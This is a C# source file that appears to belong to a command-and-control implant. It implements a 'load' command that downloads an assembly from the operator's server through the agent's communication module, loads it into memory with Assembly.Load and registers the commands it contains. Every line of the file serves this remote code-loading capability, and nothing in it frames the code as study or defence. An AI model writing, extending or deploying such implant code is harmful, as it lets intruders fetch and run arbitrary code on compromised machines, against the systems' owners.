using Agent.Models;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;

namespace Agent.Commands
{
    public class LoadCommand : AgentCommand
    {
        public override string Name => "load";

        public override void InnerExecute(AgentTask task, Models.Agent agent, AgentTaskResult result, CommModule commm)
        {
            if (task.SplittedArgs.Length == 0)
            {
                result.Result = "Please specify the name of the assembly to load commands from!";
                return;
            }

            var fileName = task.SplittedArgs[0];
            var fileContent = commm.Download(fileName, a =>
            {
                result.Info = $"Downloading {fileName} ({a}%)";
                commm.SendResult(result);
                }).Result;

            var cur = Assembly.GetExecutingAssembly();
            result.Result += $"Current assembly : {cur.FullName}{Environment.NewLine}";
            var agentType = typeof(AgentCommand);
            result.Result += $"{agentType.AssemblyQualifiedName} | {agentType.FullName}";
            result.Result += $"{agentType.ToString()}";


            var assembly = Assembly.Load(fileContent);
            result.Result += $"Loaded assembly : {assembly.FullName}{Environment.NewLine}";


            int commandCOunt = agent.LoadCommands(assembly);

            result.Result += $"Loaded {commandCOunt} from {Path.GetFileNameWithoutExtension(fileName)} Module.";
        }
    }
}
